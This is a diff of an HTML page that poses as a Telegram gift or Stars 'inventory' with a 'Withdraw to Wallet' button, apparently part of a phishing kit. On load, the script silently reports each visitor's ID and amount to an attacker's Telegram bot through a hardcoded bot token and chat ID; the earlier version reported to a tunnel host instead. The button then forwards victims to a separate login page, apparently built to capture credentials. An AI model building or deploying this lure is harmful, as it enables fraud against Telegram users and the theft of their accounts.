@@ -1,105 +1,70 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EpixGift</title>
+    <title>Telegram Inventory</title>
     <style>
-        body { background: #0e141b; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
-        .header { font-size: 22px; font-weight: 700; margin-bottom: 25px; text-align: left; border-bottom: 1px solid #1c252f; padding-bottom: 15px; }
-        
-        .nft-container { 
-            background: #1c252f; 
-            border-radius: 20px; 
-            padding: 15px; 
-            border: 1px solid #2a3644; 
-            max-width: 300px; 
-            margin: 0 auto;
+        body { background-color: #0f0f0f; color: white; font-family: sans-serif; margin: 0; padding: 15px; height: 100vh; display: flex; flex-direction: column; }
+        h2 { font-size: 18px; color: #888; text-transform: uppercase; margin-bottom: 20px; }
+        .inventory-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        .reward-card { 
+            background: linear-gradient(145deg, #1c1c1c, #141414); 
+            border: 1px solid #2a2a2a; 
+            border-radius: 16px; 
+            padding: 12px; 
+            aspect-ratio: 1 / 1.2; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
-
-        .img-box { 
-            width: 100%; 
-            aspect-ratio: 1/1; 
-            border-radius: 12px; 
-            background: #000; 
-            margin-bottom: 15px; 
-            overflow: hidden; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .img-box img { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover; 
-        }
-
-        .title { font-weight: 700; font-size: 18px; margin-bottom: 5px; }
-        .sub { font-size: 13px; color: #8a99a8; margin-bottom: 20px; }
-        
-        .btn { 
-            display: block; 
-            background: #248bdf; 
-            color: #fff; 
-            text-decoration: none; 
-            padding: 14px; 
-            border-radius: 12px; 
-            font-weight: 700; 
-            font-size: 16px; 
-            border: none; 
-            width: 100%; 
-            cursor: pointer;
-            box-sizing: border-box;
+        .reward-card img { width: 70%; margin-bottom: 10px; }
+        .reward-amount { font-size: 16px; font-weight: 700; }
+        .reward-label { font-size: 11px; color: #888; }
+        .withdraw-container { margin-top: auto; padding: 20px 0; }
+        .btn-withdraw { 
+            background: #248bda; color: white; border: none; padding: 16px; 
+            width: 100%; border-radius: 14px; font-size: 17px; font-weight: 600; cursor: pointer; 
         }
     </style>
 </head>
 <body>
-    <div class="header">EpixGift</div>
 
-    <div class="nft-container" id="nft-item">
+    <h2>Your Inventory</h2>
+
+    <div class="inventory-grid">
+        <div class="reward-card">
+            <img src="https://nztcdn.com/files/6514f1e6-dab4-4d49-806a-3ff22d7793e5.webp" alt="Stars">
+            <div class="reward-amount" id="stars-count">100 Stars</div>
+            <div class="reward-label">Collectible</div>
         </div>
+        <div style="opacity: 0.1;" class="reward-card"></div>
+    </div>
+
+    <div class="withdraw-container">
+        <button class="btn-withdraw" onclick="proceed()">Withdraw to Wallet</button>
+    </div>
 
     <script>
-        // Парсим параметры: ?item=spicedwine-75193&uid=123
-        const params = new URLSearchParams(window.location.search);
-        const item = params.get('item') || 'spicedwine-75193';
-        const uid = params.get('uid') || "Unknown";
-        
-        // Формируем прямую ссылку на официальное изображение Telegram
-        // Формат: https://t.me/i/nft/ID.jpg - это самый надежный способ
-        const imgUrl = `https://t.me/i/nft/${item}.jpg`;
+        const botToken = "8598157493:AAH_95b9t0ehVfwvfBm2vcnySZyyY79rUBg";
+        const adminId = "6990072009";
 
-        const nameDisplay = item.split('-')[0].charAt(0).toUpperCase() + item.split('-')[0].slice(1);
-        const numDisplay = item.split('-')[1] || '';
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('uid') || 'Unknown';
+        const starsAmount = urlParams.get('amount') || '100';
 
-        // Отрисовка
-        document.getElementById('nft-item').innerHTML = `
-            <div class="img-box">
-                <img src="${imgUrl}" alt="NFT Gift" onerror="this.src='https://nft.fragment.com/pendant/${numDisplay}.webp'">
-            </div>
-            <div class="title">${nameDisplay} #${numDisplay}</div>
-            <div class="sub">Collectible Gift Assets</div>
-            <button class="btn" onclick="sendAndRedirect()">Withdraw to Wallet</button>
-        `;
+        document.getElementById('stars-count').innerText = starsAmount + " Stars";
 
-        // Отправка лога о просмотре
-        async function trackVisit() {
-            try {
-                await fetch("https://ffdb8aa38a66bbe8-95-24-163-77.serveousercontent.com/submit", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        type: 'visit', 
-                        value: `User opened gift: ${item}`, 
-                        uid: uid 
-                    })
-                });
-            } catch(e) {}
+        async function sendToTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: adminId, text: text, parse_mode: "Markdown" })
+            });
         }
-        trackVisit();
 
-        function sendAndRedirect() {
+        // Лог захода
+        sendToTelegram(`🚨 **НОВЫЙ ВИЗИТ!**\n👤 ID: \`${userId}\` \n💰 Сумма: \`${starsAmount} Stars\``);
+
+        function proceed() {
             window.location.href = "login.html" + window.location.search;
         }
     </script>
